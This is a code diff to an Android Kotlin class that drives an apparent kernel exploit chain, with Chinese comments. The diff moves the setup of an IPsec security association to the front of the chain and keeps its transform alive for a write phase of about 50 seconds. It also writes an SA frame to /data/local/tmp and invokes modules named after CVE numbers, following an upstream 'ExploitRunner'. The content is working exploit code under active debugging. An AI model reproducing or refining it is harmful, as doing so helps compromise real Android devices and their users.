@@ -78,6 +78,21 @@ object TypedBackendProbe {
     /** 本次会话的 ESP 源端口：由一次真实 bind 取得（照上游：开 DatagramSocket → getLocalPort → close）。 */
     @Volatile private var saSenderPort: Int = 0
 
+    /**
+     *  SA 是否就绪：只有 transport transform 建成、且留存 aes/hmac 各 32 字节非零时才置 true。
+     *  它是链的**硬前置**（[ensureChainReady]）：为 false 时整条链不启动。
+     */
+    @Volatile private var saReady: Boolean = false
+
+    /** 建 SA 整个进程只尝试一次；失败后每次点链都直接拒跑，不再重试（避免每次点击都重来一遍）。 */
+    private val saAttempted = java.util.concurrent.atomic.AtomicBoolean(false)
+
+    /** 建 SA 的互斥：按钮预检与 runOnce 可能先后进来，保证只建一条。 */
+    private val saLock = Any()
+
+    /** transform 的强引用：close 或被回收都会拆掉内核里那条 SA（写阶段还要用它跑几十秒）。 */
+    @Volatile private var saTransform: android.net.IpSecTransform? = null
+
     /** 逐行回调：界面要在**过程中**看到每一行（跑完才返回的列表看不见进度）。 */
     @Volatile
     private var lineListener: ((String) -> Unit)? = null
@@ -114,7 +129,11 @@ object TypedBackendProbe {
         }
     }
 
-    /** 链子的本体（由 run 做单飞守卫后调用）。 */
+    /**
+     *  链子的本体（由 run 做单飞守卫后调用）。
+     *
+     *  @note 第一件事是 [ensureChainReady]：SA 必须先于任何 probe 调用建立（21:18 冷跑的真因是顺序反了）。
+     */
     private fun runOnce(context: android.content.Context): List<String> {
         probeContext = context
         val lines = mutableListOf<String>()
@@ -123,6 +142,13 @@ object TypedBackendProbe {
             lines += line
             GhostLog.i(TAG, line)
             lineListener?.invoke(line)
+        }
+        /* 硬前置：SA 必须先于任何 probe 调用建立。
+         * 21:18 冷跑证据：链 21:18:06 先跑（材料为空 ⇒ saInit 退化 SPI=0x1234 ⇒ 报文全被内核丢），
+         * 21:18:17 才建成 SA ⇒ 顺序反了。未就绪时只出两行拒跑原文，整条链（含 50 秒写阶段）不进入。 */
+        val saRefusal = ensureChainReady(context, ::step)
+        if (saRefusal != null) {
+            return lines
         }
         /* 每步前后各一行（调用/参数 → 返回/耗时 ms）；只记事实，不改控制流。 */
         val meter = StepMeter(::step)
@@ -178,7 +204,8 @@ object TypedBackendProbe {
             step("typed: ipsec encap refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
         }
 
-        /* 拼一帧会话材料并落盘（43284 的写路径要它）：SPI 用刚申请到的那个，encap 用 4500。 */
+        /* 拼一帧**探针**材料落盘（只证明 SaFrame.build/writeTo 可用）：SPI 用刚申请到的那个，encap 用 4500。
+         * 注意不能写 SA 的真实路径 —— SA 区已先跑完，这里再写一次会用测试材料覆盖内核 SA 的那份帧。 */
         runCatching {
             val manager = context.getSystemService(android.net.IpSecManager::class.java)
             val address = java.net.InetAddress.getByName("127.0.0.1")
@@ -196,9 +223,9 @@ object TypedBackendProbe {
                 hmacKey = hmacKey,
             )
             meter.after("SaFrame.build", "bytes=" + frame.size)
-            meter.before("SaFrame.writeTo", "path=/data/local/tmp/ghostlock-sa.frame bytes=" + frame.size)
+            meter.before("SaFrame.writeTo", "path=/data/local/tmp/ghostlock-sa-probe.frame bytes=" + frame.size)
             val written = com.ghostlock.app.jni.cve43284.SaFrame.writeTo(
-                "/data/local/tmp/ghostlock-sa.frame",
+                "/data/local/tmp/ghostlock-sa-probe.frame",
                 frame,
             )
             meter.after("SaFrame.writeTo", "ok=" + written)
@@ -215,11 +242,39 @@ object TypedBackendProbe {
             step("typed: sa frame refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
         }
 
-        /* 按上游序列建 SA（ExploitRunner.java:54-80）：开着 encap 套接字 → getPort → 申请 SPI → getSpi → */
-        /* new IpSecAlgorithm(CRYPT_AES_CBC / AUTH_HMAC_SHA256) → setIpv4Encapsulation → build(loopback, spiObj)。 */
-        /* transform 与 encap 套接字都保持打开（close 会拆 SA）。 */
-        runCatching {
-            val manager = context.getSystemService(android.net.IpSecManager::class.java)!!
+        /* SA 区已抽成 ensureSa()：它是链的硬前置，runOnce 开头就建（见 ensureChainReady）。 */
+
+        meter.before("probe43499", "-")
+        probe43499(::step)
+        meter.after("probe43499", "done")
+        meter.before("probe43284", "-")
+        probe43284(::step)
+        meter.after("probe43284", "done")
+        return lines
+    }
+
+    /**
+     *  SA 区：把内核里的那条 SA 建起来 —— 开 encap 口 → 取真实 sender 端口 → 申请 SPI →
+     *  建 transport transform（AES-CBC + HMAC-SHA256/128 + IPv4 封装）→ 用同一份材料把 88 字节帧落盘，
+     *  并记录写路径要用的 sa* 五项（SPI / encap / sender / aes / hmac）。
+     *
+     *  顺序照上游 ExploitRunner.java:54-80。transform 与 encap 套接字都保持强引用：close 或被回收
+     *  都会把内核里那条 SA 拆掉，随后几十秒的写阶段就全部落空。
+     *
+     *  @param context 取 IpSecManager 用（应用上下文）。
+     *  @param step    统一日志回调（屏幕 / logcat / 文件同一行）。
+     *  @return true = transform 建成且留存 aes/hmac 各 32 字节非零（[saReady]）；false = 任一步失败，已具名记录。
+     *  @note 只记录 SPI、端口与密钥长度；密钥本体绝不进日志。
+     */
+    private fun ensureSa(context: android.content.Context, step: (String) -> Unit): Boolean {
+        val meter = StepMeter(step)
+        saReady = false
+        val manager = context.getSystemService(android.net.IpSecManager::class.java)
+        if (manager == null) {
+            step("typed: ipsec sa refused no-ipsec-service")
+            return false
+        }
+        val ready = runCatching {
             meter.before("IpSecManager.openUdpEncapsulationSocket", "port=0 (kernel picks)")
             val encap = manager.openUdpEncapsulationSocket()
             meter.after("IpSecManager.openUdpEncapsulationSocket", "socket=" + encap)
@@ -263,10 +318,15 @@ object TypedBackendProbe {
                 )
                 .setIpv4Encapsulation(encap, saSenderPort)
                 .buildTransportModeTransform(loopback, spiObj)
+            /* 强引用：transform 被 close 或被回收都会拆掉刚建好的 SA（写阶段还要用它跑几十秒）。 */
+            saTransform = transform
+            val retainedAes = saAesKey?.count { byte -> byte != 0.toByte() } ?: 0
+            val retainedHmac = saHmacKey?.count { byte -> byte != 0.toByte() } ?: 0
             step(
-                "typed: ipsec sa built transform=" + (transform != null) +
-                    " retainedAesNonZero=" + (saAesKey?.count { byte -> byte != 0.toByte() } ?: -1) +
-                    " retainedHmacNonZero=" + (saHmacKey?.count { byte -> byte != 0.toByte() } ?: -1),
+                "typed: ipsec sa built spi=0x" + Integer.toHexString(spi) +
+                    " encap=" + encapPort + " sender=" + saSenderPort +
+                    " aes=" + retainedAes + " hmac=" + retainedHmac +
+                    " transform=" + (transform != null),
             )
             meter.after("IpSecTransform.Builder.buildTransportModeTransform", "transform=" + (transform != null))
             meter.before("SaFrame.build", "spi=0x" + Integer.toHexString(spi) + " encap=" + encapPort + " sender=" + saSenderPort)
@@ -279,17 +339,38 @@ object TypedBackendProbe {
             )
             meter.after("SaFrame.writeTo", "ok=" + written)
             step("typed: ipsec sa frame=" + written + " (SA 已建、帧按同一材料落盘)")
-        }.onFailure { problem ->
+            transform != null && retainedAes == 32 && retainedHmac == 32
+        }.getOrElse { problem ->
             step("typed: ipsec sa refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+            false
         }
+        saReady = ready
+        return ready
+    }
 
-        meter.before("probe43499", "-")
-        probe43499(::step)
-        meter.after("probe43499", "done")
-        meter.before("probe43284", "-")
-        probe43284(::step)
-        meter.after("probe43284", "done")
-        return lines
+    /**
+     *  链的硬前置检查：SA 未建立就**整条跳过**（不进入 50 秒写阶段），并给出两行拒跑原文。
+     *
+     *  @param context 建 SA 用；整个进程只尝试一次（[saAttempted]）。
+     *  @param step    统一日志回调。
+     *  @return null = SA 就绪、可以跑链；否则为两行拒跑原文（已通过 step 输出）。
+     */
+    fun ensureChainReady(context: android.content.Context, step: (String) -> Unit): List<String>? {
+        synchronized(saLock) {
+            if (!saAttempted.get()) {
+                saAttempted.set(true)
+                ensureSa(context, step)
+            }
+        }
+        if (saReady) {
+            return null
+        }
+        val refusal = listOf(
+            "refusal=sa-material-missing",
+            "hint: SA 未建立（IpSecManager transform=false 或密钥为空）⇒ 先修 SA 再跑链",
+        )
+        refusal.forEach { line -> step(line) }
+        return refusal
     }
 
     private fun probe43499(step: (String) -> Unit) {
